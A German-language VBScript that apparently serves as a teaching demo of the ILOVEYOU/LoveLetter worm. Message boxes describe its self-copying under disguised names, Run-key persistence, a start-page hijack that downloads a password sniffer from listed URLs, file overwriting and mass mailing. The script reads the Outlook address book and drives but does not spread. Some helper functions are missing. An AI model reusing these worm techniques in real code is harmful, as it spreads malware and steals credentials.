rem
rem warnung! so koennte ein virus arbeiten !
rem
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()

sub main()
On Error Resume Next
dim wscr,rr
msg = "Zuerst setze jetzt ich den timeout des scripting host auf deiner maschine auf null." 
msg = msg + vbCRLF + "dadurch kann ein script unendlich lange laufen (z.b. zum loeschen von dateien)"
MsgBox msg

Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)

msg = "Dann kopiere ich mich selber nach: "  + vbCRLF + vbCRLF
msg = msg + dirsystem&"\MSKernel32.vbs" + vbCRLF
msg = msg + dirwin&"\Win32DLL.vbs"
msg = msg + dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs"
MsgBox msg

regruns()
html()
spreadtoemail()
listadriv()

msg = "So. jetzt waere dein rechner infiziert, alle jpg und anderen o.g. dateien sind auch viren"
msg = msg + vbCRLF + "und alle deine mailpartner haben den virus auch"
msg = msg + vbCRLF + vbCRLF + "ENDE."

MsgBox msg
end sub

sub regruns()
On Error Resume Next
Dim num,downread
msg = "Jetzt trage ich mich in die registry ein, um bei jedem windows neustart direkt aufgerufen zu werden." + vbCRLF
msg = msg + vbCRLF + "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32" + "=" + dirsystem&"\MSKernel32.vbs"
msg = msg + vbCRLF + "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL"  + "=" + dirwin&"\Win32DLL.vbs"
MsgBox msg

downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
sp = "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page =" + "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
sp "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page = "+ "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
sp = "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page = " + "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
sp = "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page = "+ "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
msg = "Dann aendere ich mal eben die startpage vom internet explorer," + vbCRLF
msg = msg + "damit auch schoen das WIN-BUGSFIX.exe beim naechsten start runtergeladen wird" + vbCRLF
msg = msg + "-> das ist aber kein Bug-Fix sondern ein Password-Sniffer !!" + vbCRLF
msg = msg + vbCRLF + sp
MsgBox msg
end if

sp = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX = " + downread&"\WIN-BUGSFIX.exe"
msg = "Wenn die win-bugsfix.exe auf deinem Rechner schon existiert, wird diese jetzt als autostart-exe eingetragen:" + vbCRLF
msg = msg + vbCRLF + sp
MsgBox msg
end sub

sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
target = ""
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
target = target + vbCRLF + d.path&"\"
end if
Next
msg = "Jetzt gehe ich durch folgende Laufwerke und ersetzt alle"
msg = msg + vbCRLF + "js jse css wsh sct hta vbs vse jpg jpeg mp2 mp3 - Dateien durch mich selbst"
msg = msg + vbCRLF + target
msg = msg + vbCRLF + "und sende mich, fallst du im IRC chattest, beim naechsten Chat an alle Mitglieder des chats."
MsgBox msg
end sub


sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
MsgBox "Jetzt lese ich erst mal dein Adressbuch. Klick OK und warte!"
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
msg = "Dann sende ich mich per mail an folgende "+ mapi.AddressLists.Count +" Leute:" + vbCRLF
msg = msg + "(Die Liste wird wahrscheinlich nicht ganz angezeigt, weil sie zu lang ist)" + vbCRLF + vbCRLF
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
msg = msg + malead + ", "
x=x+1
next
next
Set out=Nothing
Set mapi=Nothing
MsgBox msg
end sub

sub html
msg = "Jetzt erstelle ich noch den loveletter.htm im systemverzeichnis unter:"
msg = msg + vbCRLF + dirsystem+"\LOVE-LETTER-FOR-YOU.HTM"
MsgBox msg
end sub